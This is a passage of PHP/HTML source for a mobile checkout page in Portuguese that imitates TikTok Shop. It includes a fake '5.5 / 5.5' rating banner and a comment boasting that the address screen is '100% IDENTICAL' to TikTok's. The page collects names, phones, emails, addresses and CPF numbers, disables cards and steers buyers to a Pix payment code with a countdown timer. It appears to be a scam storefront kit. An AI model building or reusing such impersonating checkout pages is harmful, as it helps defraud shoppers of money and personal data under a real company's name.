<?php
require_once '../api/db.php';

$settings = [];
try {
    $stmt = $pdo->query("SELECT setting_key, setting_value FROM settings");
    while ($row = $stmt->fetch()) {
        $settings[$row['setting_key']] = $row['setting_value'];
    }
} catch (Exception $e) {}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TikTok Shop - Checkout</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Inter', system-ui, -apple-system, sans-serif; background-color: #f4f4f6; color: #111827; }
        .line-clamp-2 { display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; }
    </style>
<?php if (!empty($settings['facebook_pixel_id'])): ?>
<!-- Facebook Pixel Code -->
<script>
!function(f,b,e,v,n,t,s)
{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};
if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];
s.parentNode.insertBefore(t,s)}(window, document,'script',
'https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '<?= htmlspecialchars($settings['facebook_pixel_id']) ?>');
fbq('track', 'PageView');
</script>
<noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=<?= htmlspecialchars($settings['facebook_pixel_id']) ?>&ev=PageView&noscript=1"/></noscript>
<!-- End Facebook Pixel Code -->
<?php endif; ?>

<?php if (!empty($settings['tiktok_pixel_id'])): ?>
<!-- TikTok Pixel Code -->
<script>
!function (w, d, t) {
  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie"],ttq.setAndVerify=function(t,e){for(var n=0;n<ttq.methods.length;n++)ttq[t][e[n]]=ttq[t][e[n]]||function(t){return function(){t.push([e[n]].concat(Array.prototype.slice.call(arguments,0)))}}(t)};for(var e=0;e<ttq.methods.length;e++)ttq.setAndVerify(ttq,ttq.methods[e]);ttq.instance=function(t){for(var e=ttq.methods,n=0;n<e.length;n++)ttq.setAndVerify(t,e[n]);return t},ttq.load=function(e,n){var i="https://analytics.tiktok.com/i18n/pixel/events.js";ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=i,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._t[e]._p=n||{},ttq._t[e]._i=ttq._i[e];var o=d.createElement("script");o.type="text/javascript",o.async=!0,o.src=i+"?sdkid="+e+"&lib="+t;var a=d.getElementsByTagName("script")[0];a.parentNode.insertBefore(o,a)};
  ttq.load('<?= htmlspecialchars($settings['tiktok_pixel_id']) ?>');
  ttq.page();
}(window, document, 'ttq');
</script>
<?php endif; ?>
</head>
<body class="bg-[#f4f4f6] min-h-screen pb-[120px]">
    <!-- Top Header -->
    <header class="bg-white sticky top-0 z-40 border-b border-gray-100 px-3 h-12 flex items-center justify-between shadow-xs">
        <button onclick="window.history.back()" class="p-1 rounded-full text-gray-700 active:scale-95">
            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"></polyline></svg>
        </button>
        <div class="flex items-center gap-1.5 text-xs font-bold text-gray-800">
            <span class="text-amber-500">⭐</span>
            <span>Ótima avaliação! 5.5 / 5.5</span>
        </div>
        <div class="w-6"></div>
    </header>

    <main class="max-w-[480px] mx-auto space-y-2">
        
        <!-- Section 1: Endereço de Envio -->
        <section class="bg-white relative shadow-2xs cursor-pointer" onclick="window.openAddressModal()">
            <div id="addr-empty" class="p-3.5 flex items-center justify-between text-xs font-bold">
                <div class="flex items-center gap-1.5 text-gray-900">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-gray-600"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path><circle cx="12" cy="10" r="3"></circle></svg>
                    <span>Endereço de envio</span>
                </div>
                <div class="text-[#fe2c55] font-bold text-xs hover:underline flex items-center gap-0.5">
                    <span id="addr-btn-text">+ Adicionar endereço</span>
                </div>
            </div>
            <div id="addr-display" class="hidden relative pt-4 pb-5">
                <div class="flex items-start px-3.5 gap-2.5">
                    <div class="mt-0.5 shrink-0">
                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-gray-900"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path><circle cx="12" cy="10" r="3"></circle></svg>
                    </div>
                    <div class="flex-1 min-w-0 pr-6">
                        <div class="text-[15px] font-bold text-gray-900 leading-snug flex items-center flex-wrap">
                            <span id="addr-name" class="truncate max-w-full"></span>
                            <span>,&nbsp;</span>
                            <span id="addr-phone"></span>
                        </div>
                        <div id="addr-full" class="text-[14px] text-gray-600 mt-1 leading-snug"></div>
                    </div>
                    <div class="absolute right-3.5 top-[18px]">
                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"></polyline></svg>
                    </div>
                </div>
                <!-- Faixa colorida estilo envelope -->
                <div class="absolute bottom-0 left-0 right-0 h-[3px]" style="background: repeating-linear-gradient(135deg, #1cb6d6 0px, #1cb6d6 16px, transparent 16px, transparent 24px, #eb345d 24px, #eb345d 40px, transparent 40px, transparent 48px);"></div>
            </div>
        </section>

        <!-- Section 2: Produto e Variação -->
        <section class="bg-white p-3.5 space-y-3 shadow-2xs">
            <div class="flex items-center justify-between text-xs border-b border-gray-100 pb-2">
                <span id="chk-store-name" class="font-bold text-gray-900 text-[13px]">Lu Variedades</span>
                <span id="chk-note-btn" onclick="window.openNoteModal()" class="text-gray-400 text-xs flex items-center gap-0.5 cursor-pointer hover:text-gray-600 transition-colors">
                    Adicionar nota <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="9 18 15 12 9 6"></polyline></svg>
                </span>
            </div>

            <div class="flex items-start gap-3">
                <img id="chk-img" src="/assets/bighome-logo-BXgKvfO0.png" class="w-[76px] h-[76px] rounded-lg object-cover bg-gray-50 border border-gray-100 shrink-0" alt="Produto">
                
                <div class="flex-1 min-w-0 space-y-1">
                    <h1 id="chk-title" class="text-xs font-medium text-gray-800 line-clamp-2 leading-snug">Carregando produto...</h1>
                    <p id="chk-variation" class="hidden text-[11px] font-semibold text-gray-400 uppercase tracking-tight"></p>
                    
                    <div class="inline-flex items-center gap-1 text-[10px] font-bold text-amber-700 bg-amber-50 px-1.5 py-0.5 rounded-sm">
                        <svg width="10" height="10" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2L4 5v6c0 5 3.5 9.5 8 11 4.5-1.5 8-6 8-11V5z"></path></svg>
                        <span>Devolução gratuita</span>
                    </div>

                    <div class="flex items-center gap-1.5 pt-1 flex-wrap">
                        <span id="chk-price" class="text-base font-extrabold text-[#fe2c55] whitespace-nowrap">R$ 0,00</span>
                        <span id="chk-orig-price" class="text-xs text-gray-400 line-through whitespace-nowrap">R$ 0,00</span>
                        <span id="chk-pct-badge" class="bg-[#ffe5eb] text-[#fe2c55] text-[10px] font-extrabold px-1 rounded-xs whitespace-nowrap shrink-0">-0%</span>
                    </div>
                </div>

                <!-- Quantity Stepper -->
                <div class="flex items-center border border-gray-200 rounded-md h-7 px-1.5 bg-white text-xs font-bold gap-2 shrink-0">
                    <button onclick="window.changeCheckoutQty(-1)" class="w-4 h-full flex items-center justify-center text-gray-500 hover:text-black">-</button>
                    <span id="chk-qty" class="w-3 text-center text-gray-900">1</span>
                    <button onclick="window.changeCheckoutQty(1)" class="w-4 h-full flex items-center justify-center text-gray-500 hover:text-black">+</button>
                </div>
            </div>
        </section>

        <!-- Section 3: Desconto do TikTok Shop -->
        <section class="bg-white px-3.5 py-3 flex items-center justify-between text-xs font-bold text-gray-900 shadow-2xs">
            <div class="flex items-center gap-2">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#fe2c55" stroke-width="2"><path d="M2 9h20v6H2z"></path><path d="M2 13h6v3H2zm14 0h6v3h-6z"></path></svg>
                <span>Desconto do TikTok Shop</span>
            </div>
        </section>

        <!-- Section 4: Resumo do Pedido -->
        <section class="bg-white p-3.5 space-y-2 text-xs shadow-2xs">
            <h2 class="font-bold text-sm text-gray-900 mb-2">Resumo do Pedido</h2>
            
            <div class="flex justify-between items-center text-gray-800">
                <span class="flex items-center gap-1">Subtotal do produto <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="18 15 12 9 6 15"></polyline></svg></span>
                <span id="sum-subtotal" class="font-bold">R$ 0,00</span>
            </div>
            <div class="flex justify-between items-center text-gray-500">
                <span>Preço original</span>
                <span id="sum-orig">R$ 0,00</span>
            </div>
            <div class="flex justify-between items-center text-gray-500">
                <span>Desconto no produto</span>
                <span id="sum-discount" class="text-[#fe2c55] font-semibold">- R$ 0,00</span>
            </div>

            <div class="border-t border-gray-100 my-2"></div>

            <div class="flex justify-between items-baseline pt-1">
                <span class="font-bold text-sm text-gray-900">Total</span>
                <div class="text-right">
                    <span id="sum-total" class="font-extrabold text-base text-gray-900">R$ 0,00</span>
                    <p class="text-[10px] text-gray-400">Impostos inclusos</p>
                </div>
            </div>
        </section>

        <!-- Section 5: Forma de Pagamento -->
        <section class="bg-white p-3.5 space-y-3 shadow-2xs">
            <h2 class="font-bold text-sm text-gray-900">Forma de pagamento</h2>

            <div class="p-3 rounded-xl border border-gray-200 flex items-start justify-between cursor-not-allowed opacity-40 grayscale pointer-events-none transition-opacity bg-gray-50">
                <div class="space-y-1">
                    <div class="flex items-center gap-1.5 text-xs font-bold text-gray-800">
                        <span class="text-gray-500">+</span> Cartão de crédito
                    </div>
                    <div class="flex items-center gap-1 pt-0.5">
                        <span class="w-6 h-4 bg-red-500 rounded-xs inline-block"></span>
                        <span class="text-[10px] font-bold italic text-blue-900">VISA</span>
                        <span class="text-[10px] font-bold text-amber-500">elo</span>
                        <span class="text-[9px] font-bold text-blue-600">AMEX</span>
                    </div>
                    <div class="inline-block bg-gray-200 text-gray-600 text-[10px] font-bold px-2 py-0.5 rounded-full mt-1">
                        Indisponível: Oferta apenas para pagamentos à vista
                    </div>
                    <p class="text-[11px] text-gray-500">Pague em até 2 parcelas</p>
                </div>
                <input type="radio" name="pay_method" class="mt-1 accent-gray-400" disabled>
            </div>

            <div class="p-3 rounded-xl border-2 border-[#fe2c55] bg-pink-50/20 flex items-center justify-between cursor-pointer">
                <div class="flex items-center gap-2 text-xs font-bold text-gray-900">
                    <span class="w-4 h-4 bg-emerald-500 text-white rounded-xs flex items-center justify-center text-[10px] font-bold">❖</span>
                    <span>Pix</span>
                </div>
                <input type="radio" name="pay_method" checked class="accent-[#fe2c55] w-4 h-4">
            </div>


        </section>

        <!-- Terms Disclaimer -->
        <p class="p-4 text-[11px] text-gray-400 leading-relaxed text-center">
            Ao fazer um pedido, você concorda com <a href="#" class="underline">Termos de uso e venda do TikTok Shop</a> e reconhece que leu e concordou com a <a href="#" class="underline">Política de privacidade do TikTok</a>.
        </p>

    </main>

    <!-- Fixed Bottom Bar -->
    <div class="fixed bottom-0 left-0 right-0 max-w-[480px] mx-auto bg-white border-t border-gray-100 z-30 shadow-lg">
        <div class="bg-[#fff0f3] text-[#fe2c55] text-xs font-bold py-1.5 px-3 flex items-center justify-center gap-1.5">
            <span>😄</span>
            <span>Você está economizando <span id="bar-savings">R$ 0,00</span> nesse pedido.</span>
        </div>

        <div class="p-3 flex items-center justify-between gap-3">
            <div class="leading-tight">
                <p class="text-xs font-bold text-gray-900">Total (<span id="bar-items-count">1</span> item)</p>
                <p id="bar-total" class="text-lg font-extrabold text-[#fe2c55]">R$ 0,00</p>
            </div>

            <button onclick="window.handleOrderSubmit()" class="h-11 px-8 rounded-full bg-[#fe2c55] hover:bg-[#e02648] text-white font-extrabold text-sm shadow-md active:scale-98 transition-all flex items-center justify-center">
                Fazer pedido
            </button>
        </div>
    </div>

    <!-- 100% IDENTICAL TIKTOK SHOP ADDRESS SCREEN MODAL -->
    <div id="addressModal" class="fixed inset-0 z-50 bg-[#f4f4f6] hidden flex flex-col overflow-y-auto">
        <!-- Address Header -->
        <header class="bg-white sticky top-0 z-10 border-b border-gray-100 px-4 h-12 flex items-center justify-between shadow-2xs shrink-0">
            <button onclick="window.closeAddressModal()" class="p-1 rounded-full text-gray-800 active:scale-95">
                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"></polyline></svg>
            </button>
            <h1 class="font-extrabold text-base text-gray-900 flex-1 text-center pr-6">Adicionar o novo endereço</h1>
        </header>

        <form id="addressForm" onsubmit="window.saveAddressData(event)" oninput="window.validateAddressForm()" class="max-w-[480px] mx-auto w-full p-3.5 space-y-4 flex-1 pb-28">
            
            <!-- Section 1: Informações de contato -->
            <div>
                <p class="text-xs font-bold text-gray-500 mb-1.5 px-1">Informações de contato</p>
                <div class="bg-white rounded-xl p-4 space-y-3.5 border border-gray-100 shadow-2xs">
                    <div>
                        <input type="text" id="cust_name" placeholder="Nome e sobrenome" class="w-full text-sm text-gray-900 border-b border-gray-200 pb-2 focus:outline-none focus:border-gray-400 placeholder:text-gray-400">
                        <p id="err_name" class="hidden text-[11px] text-[#dc2626] font-medium flex items-center gap-1 mt-1"><span>⚠️</span> Insira seu nome completo</p>
                    </div>

                    <div>
                        <div class="flex items-center gap-2 border-b border-gray-200 pb-2">
                            <span class="text-xs font-semibold text-gray-600 shrink-0">BR +55</span>
                            <span class="text-gray-300">|</span>
                            <input type="text" id="cust_phone" placeholder="Número de telefone" class="w-full text-sm text-gray-900 focus:outline-none placeholder:text-gray-400">
                        </div>
                        <p id="err_phone" class="hidden text-[11px] text-[#dc2626] font-medium flex items-center gap-1 mt-1"><span>⚠️</span> Insira o número de telefone</p>
                    </div>

                    <div>
                        <input type="email" id="cust_email" placeholder="E-mail" class="w-full text-sm text-gray-900 border-b border-gray-200 pb-2 focus:outline-none focus:border-gray-400 placeholder:text-gray-400">
                        <p id="err_email" class="hidden text-[11px] text-[#dc2626] font-medium flex items-center gap-1 mt-1"><span>⚠️</span> Insira um endereço de e-mail válido</p>
                    </div>
                </div>
            </div>

            <!-- Section 2: Informações de endereço -->
            <div>
                <p class="text-xs font-bold text-gray-500 mb-1.5 px-1">Informações de endereço</p>
                <div class="bg-white rounded-xl p-4 space-y-3.5 border border-gray-100 shadow-2xs">
                    <div>
                        <input type="text" id="cust_cep" onchange="window.lookupCEP()" placeholder="CEP/Código postal" class="w-full text-sm text-gray-900 border-b border-gray-200 pb-2 focus:outline-none focus:border-gray-400 placeholder:text-gray-400">
                        <p id="err_cep" class="hidden text-[11px] text-[#dc2626] font-medium flex items-center gap-1 mt-1"><span>⚠️</span> Insira o CEP</p>
                    </div>

                    <div class="grid grid-cols-2 gap-3">
                        <div class="border-b border-gray-200 pb-2 flex items-center justify-between">
                            <input type="text" id="cust_uf" placeholder="Estado/UF" class="w-full text-sm text-gray-900 focus:outline-none placeholder:text-gray-400">
                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="text-gray-400 shrink-0"><polyline points="6 9 12 15 18 9"></polyline></svg>
                        </div>
                        <div class="border-b border-gray-200 pb-2 flex items-center justify-between">
                            <input type="text" id="cust_city" placeholder="Cidade" class="w-full text-sm text-gray-900 focus:outline-none placeholder:text-gray-400">
                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="text-gray-400 shrink-0"><polyline points="6 9 12 15 18 9"></polyline></svg>
                        </div>
                    </div>

                    <div>
                        <input type="text" id="cust_bairro" placeholder="Bairro/Distrito" class="w-full text-sm text-gray-900 border-b border-gray-200 pb-2 focus:outline-none focus:border-gray-400 placeholder:text-gray-400">
                    </div>

                    <div>
                        <input type="text" id="cust_street" placeholder="Endereço" class="w-full text-sm text-gray-900 border-b border-gray-200 pb-2 focus:outline-none focus:border-gray-400 placeholder:text-gray-400">
                    </div>

                    <div>
                        <input type="text" id="cust_number" placeholder='Nº da residência. Use "s/n" se nenhum' class="w-full text-sm text-gray-900 border-b border-gray-200 pb-2 focus:outline-none focus:border-gray-400 placeholder:text-gray-400">
                    </div>

                    <div>
                        <input type="text" id="cust_comp" placeholder="Apartamento, bloco, unidade etc. (opcional)" class="w-full text-sm text-gray-900 border-b border-gray-200 pb-2 focus:outline-none focus:border-gray-400 placeholder:text-gray-400">
                    </div>
                </div>
            </div>

            <!-- Section 3: Informações fiscais -->
            <div>
                <p class="text-xs font-bold text-gray-500 mb-1.5 px-1">Informações fiscais</p>
                <div class="bg-white rounded-xl p-4 border border-gray-100 shadow-2xs space-y-1">
                    <input type="text" id="cust_cpf" placeholder="CPF" class="w-full text-sm text-gray-900 border-b border-gray-200 pb-2 focus:outline-none focus:border-gray-400 placeholder:text-gray-400">
                    <p class="text-[11px] text-gray-400 pt-1">O CPF será usado para emitir faturas.</p>
                </div>
            </div>

            <!-- Section 4: Configurações -->
            <div>
                <p class="text-xs font-bold text-gray-500 mb-1.5 px-1">Configurações</p>
                <div class="bg-white rounded-xl p-4 border border-gray-100 shadow-2xs flex items-center justify-between">
                    <span class="font-bold text-sm text-gray-900">Definir como padrão</span>
                    <label class="relative inline-flex items-center cursor-pointer">
                        <input type="checkbox" checked class="sr-only peer">
                        <div class="w-11 h-6 bg-gray-200 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-[#00c4cc]"></div>
                    </label>
                </div>
            </div>

            <p class="text-[11px] text-gray-400 text-center px-4 leading-relaxed pt-2">
                Leia a <a href="#" class="underline font-bold text-gray-800">Política de privacidade do TikTok</a> para saber mais sobre como usamos suas informações pessoais.
            </p>

            <!-- Bottom Floating Save Button -->
            <div class="fixed bottom-0 left-0 right-0 max-w-[480px] mx-auto bg-white p-3.5 border-t border-gray-100 z-30 shadow-lg">
                <button type="submit" id="btn-save-addr" class="w-full h-12 rounded-full bg-[#ffb0c1] text-white font-extrabold text-base transition-all shadow-md flex items-center justify-center cursor-pointer">
                    Salvar
                </button>
            </div>
        </form>
    </div>

    <!-- Modal Nota do Pedido -->
    <div id="noteModal" style="display: none;" class="fixed inset-0 z-50 bg-black/60 flex-col justify-end transition-opacity duration-300">
        <div class="absolute inset-0" onclick="window.closeNoteModal()"></div>
        <div class="relative w-full max-w-[480px] mx-auto bg-white rounded-t-3xl p-5 flex flex-col overflow-hidden z-10 shadow-2xl animate-in slide-in-from-bottom duration-300">
            <!-- Header -->
            <div class="flex items-center justify-between pb-3 border-b border-gray-100 mb-3">
                <h2 class="text-base font-extrabold text-gray-900 text-center flex-1 ml-6">Nota do pedido</h2>
                <button type="button" onclick="window.closeNoteModal()" class="text-gray-900 font-bold text-lg p-1 hover:opacity-70 cursor-pointer">✕</button>
            </div>
            <!-- Body -->
            <div class="space-y-3">
                <div class="relative bg-[#f7f7f9] rounded-2xl p-4">
                    <textarea id="note-input" maxlength="200" rows="5" oninput="window.updateNoteCounter()" placeholder="Forneça ao vendedor mais informações sobre seu pedido (opcional)" class="w-full bg-transparent border-0 outline-none text-sm text-gray-800 placeholder-gray-400 resize-none font-medium leading-relaxed"></textarea>
                    <div class="text-right text-xs text-gray-400 font-medium mt-1">
                        <span id="note-char-count">0</span>/200
                    </div>
                </div>
                <button type="button" onclick="window.saveNoteData()" class="w-full h-12 rounded-full bg-[#fe2c55] text-white font-bold text-base shadow-md active:scale-98 transition-all cursor-pointer">Salvar</button>
            </div>
        </div>
    </div>

    <!-- Tela de PIX - Estilo TikTok Shop -->
    <div id="pixModal" class="fixed inset-0 z-50 bg-[#fafafa] hidden flex-col items-center">
        <!-- Top Background Gradient -->
        <div class="absolute top-0 left-0 right-0 h-[280px] bg-gradient-to-br from-[#d9fcfb] via-[#fdf6ff] to-[#fdebf3] -z-10"></div>
        
        <!-- Header -->
        <div class="w-full max-w-[480px] px-4 pt-8 pb-4 flex items-center relative">
            <button onclick="window.closePixModal()" class="p-2 -ml-2 rounded-full text-black active:scale-95">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"></polyline></svg>
            </button>
            <h1 class="flex-1 text-center font-extrabold text-[17px] mr-6">Código do pagamento</h1>
        </div>

        <!-- Content -->
        <div class="w-full max-w-[480px] px-5 flex-1 overflow-y-auto pb-10">
            <div class="flex justify-between items-start mt-2">
                <div>
                    <h2 class="text-[26px] font-extrabold leading-tight text-gray-900 tracking-tight">Aguardando o<br>pagamento<br><span id="pix-screen-amount">R$ 0,00</span></h2>
                </div>
                <div class="w-12 h-12 bg-amber-500 rounded-full flex items-center justify-center shrink-0 mt-2 shadow-sm">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10" stroke="none"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
                </div>
            </div>

            <div class="mt-4 flex items-center gap-2">
                <span class="text-[15px] text-gray-500">Vence em</span>
                <div class="bg-[#fe2c55] text-white text-[13px] font-bold px-2 py-0.5 rounded-[4px] flex items-center gap-1 shadow-sm tracking-widest">
                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
                    <span id="pix-timer">07:00:00</span>
                </div>
            </div>
            <p class="mt-2 text-[15px] text-gray-500">Prazo <span id="pix-deadline-date" class="font-medium text-gray-700"></span></p>

            <!-- PIX Card -->
            <div class="mt-6 bg-white rounded-xl shadow-[0_4px_20px_rgba(0,0,0,0.06)] p-5">
                <div class="flex items-center gap-2 mb-4">
                    <svg width="20" height="20" viewBox="0 0 42 42" fill="none"><path d="M12.9 22.4l7.1-7.1 7.1 7.1-7.1 7.1-7.1-7.1z" fill="#32bca3"></path><path d="M4.5 14L12.9 5.6l7.1 7.1-7.1 7.1L4.5 14z" fill="#01d1b2"></path><path d="M21.3 36.4L12.9 28l7.1-7.1 7.1 7.1-5.8 5.8c-1.3 1.3-3.4 1.3-4.7 0z" fill="#32bca3"></path><path d="M28.4 14l-7.1-7.1L27.1 1.1c1.3-1.3 3.4-1.3 4.7 0L40.2 9.5c1.3 1.3 1.3 3.4 0 4.7L36.7 17.7 28.4 9.4l-7.1 7.1 7.1 7.1" fill="#01d1b2"></path></svg>
                    <span class="font-bold text-[15px]">PIX</span>
                </div>
                
                <div class="bg-white border-0 relative flex flex-col items-center">
                    <img id="pix-qr-code-img" src="" alt="QR Code PIX" class="w-48 h-48 mb-3 object-contain rounded-lg border border-gray-100 hidden shadow-xs" />
                    <p id="pix-copy-text" class="text-[14px] font-bold text-gray-900 break-all leading-tight text-center bg-gray-50 p-2.5 rounded-lg border border-gray-200 w-full">
                        ...
                    </p>
                    <input type="text" id="pix-full-key-input" class="absolute opacity-0 pointer-events-none">
                </div>

                <button onclick="window.copyPixKeyFromScreen()" id="btn-copy-pix" class="w-full mt-4 h-12 bg-[#fe2c55] text-white rounded-[6px] font-bold text-[16px] shadow-sm flex items-center justify-center gap-2 active:scale-95 transition-all">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
                    <span id="txt-copy-pix">Copiar</span>
                </button>
            </div>

            <p class="text-[13px] text-gray-600 mt-6 leading-relaxed">
                Para acessar esta página no app, abra <strong>Loja > Pedidos > Sem pagamento > Visualizar o código</strong>
            </p>

            <div class="mt-8">
                <h3 class="font-extrabold text-[20px] text-gray-900">Como fazer pagamentos com PIX?</h3>
                <p class="text-[14px] text-gray-600 mt-3 leading-relaxed">
                    Copie o código de pagamento acima, selecione Pix no seu app de internet ou de banco e cole o código.
                </p>
                <button onclick="window.location.href='/'" class="w-full mt-6 h-12 bg-gray-100 text-gray-900 rounded-[6px] font-bold text-[16px] active:scale-95 transition-all">
                    Ver pedido
                </button>
            </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/qrcode-generator@1.4.4/qrcode.min.js"></script>
    <script>
    let checkoutItem = {};

    function parseVal(valStr) {
        if (valStr === null || valStr === undefined || valStr === '') return 0;
        if (typeof valStr === 'number') return valStr;
        let s = valStr.toString().trim();
        if (s.includes(',')) {
            s = s.replace(/R\$\s*/g, '').replace(/\./g, '').replace(',', '.').trim();
        } else {
            s = s.replace(/R\$\s*/g, '').trim();
        }
        let num = parseFloat(s);
        return isNaN(num) ? 0 : num;
    }

    function formatMoney(num) {
        return 'R$ ' + num.toFixed(2).replace('.', ',');
    }

    window.openNoteModal = function() {
        const modal = document.getElementById('noteModal');
        if (modal) {
            if (typeof checkoutItem === 'undefined' || !checkoutItem) {
                checkoutItem = {};
            }
            const noteInput = document.getElementById('note-input');
            if (noteInput) {
                noteInput.value = checkoutItem.note || '';
            }
            window.updateNoteCounter();
            modal.classList.remove('hidden');
            modal.classList.add('flex');
            modal.style.display = 'flex';
        }
    };

    window.closeNoteModal = function() {
        const modal = document.getElementById('noteModal');
        if (modal) {
            modal.classList.add('hidden');
            modal.classList.remove('flex');
            modal.style.display = 'none';
        }
    };

    window.updateNoteCounter = function() {
        const input = document.getElementById('note-input');
        const count = document.getElementById('note-char-count');
        if (input && count) {
            count.innerText = input.value.length;
        }
    };

    window.saveNoteData = function() {
        const input = document.getElementById('note-input');
        const noteVal = input ? input.value.trim() : '';
        if (typeof checkoutItem === 'undefined' || !checkoutItem) {
            checkoutItem = {};
        }
        checkoutItem.note = noteVal;
        
        try {
            localStorage.setItem('checkout_item', JSON.stringify(checkoutItem));
        } catch(e) {}
        
        const noteBtnSpan = document.getElementById('chk-note-btn');
        if (noteBtnSpan) {
            const chevron = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="inline ml-0.5"><polyline points="9 18 15 12 9 6"></polyline></svg>';
            if (noteVal) {
                let textTruncated = noteVal.length > 18 ? noteVal.substring(0, 18) + '...' : noteVal;
                noteBtnSpan.innerHTML = textTruncated + ' ' + chevron;
                noteBtnSpan.classList.add('text-gray-800', 'font-bold');
                noteBtnSpan.classList.remove('text-gray-400');
            } else {
                noteBtnSpan.innerHTML = 'Adicionar nota ' + chevron;
                noteBtnSpan.classList.add('text-gray-400');
                noteBtnSpan.classList.remove('text-gray-800', 'font-bold');
            }
        }
        
        window.closeNoteModal();
    };

    window.initCheckout = function() {
        const stored = localStorage.getItem('checkout_item');
        const globalConf = window.ShopConfig || {};

        if (stored) {
            try { checkoutItem = JSON.parse(stored); } catch(e) {}
        }

        if (!checkoutItem.title) {
            checkoutItem = {
                product_id: globalConf.id || globalConf.product_id || '',
                variation_id: '',
                option_id: '',
                size_id: '',
                voltage_id: '',
                quantity: 1,
                title: globalConf.product_name || globalConf.title || 'Produto Selecionado',
                image: globalConf.product_image || globalConf.image || '',
                variation: '',
                price: globalConf.discounted_price || globalConf.price || '0,00',
                original_price: globalConf.original_price || globalConf.discount || '0,00',
                qty: 1,
                store_name: globalConf.store_name || 'TikTok Shop'
            };
        }

        // Render UI
        if (checkoutItem.store_name) document.getElementById('chk-store-name').innerText = checkoutItem.store_name;
        if (checkoutItem.image) document.getElementById('chk-img').src = checkoutItem.image;
        if (checkoutItem.title) document.getElementById('chk-title').innerText = checkoutItem.title;
        if (checkoutItem.variation) document.getElementById('chk-variation').innerText = checkoutItem.variation;
        if (checkoutItem.note) {
            const noteBtnSpan = document.getElementById('chk-note-btn');
            if (noteBtnSpan) {
                const chevron = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="inline ml-0.5"><polyline points="9 18 15 12 9 6"></polyline></svg>';
                let textTruncated = checkoutItem.note.length > 18 ? checkoutItem.note.substring(0, 18) + '...' : checkoutItem.note;
                noteBtnSpan.innerHTML = textTruncated + ' ' + chevron;
                noteBtnSpan.classList.add('text-gray-800', 'font-bold');
                noteBtnSpan.classList.remove('text-gray-400');
            }
        }
        if (checkoutItem.qty || checkoutItem.quantity) {
            const q = checkoutItem.qty || checkoutItem.quantity || 1;
            checkoutItem.qty = q;
            checkoutItem.quantity = q;
            document.getElementById('chk-qty').innerText = q;
        }

        window.updateCheckoutTotals();
        window.loadSavedAddress();
        window.validateAddressForm();

        // Fire InitiateCheckout Pixel Event
        const initVal = parseVal(checkoutItem.price) * (checkoutItem.qty || checkoutItem.quantity || 1);
        const itemTitle = checkoutItem.title || 'Produto';
        const itemId = String(checkoutItem.product_id || '');
        if (typeof fbq === 'function') {
            fbq('track', 'InitiateCheckout', {
                content_name: itemTitle,
                content_ids: [itemId],
                content_type: 'product',
                value: initVal,
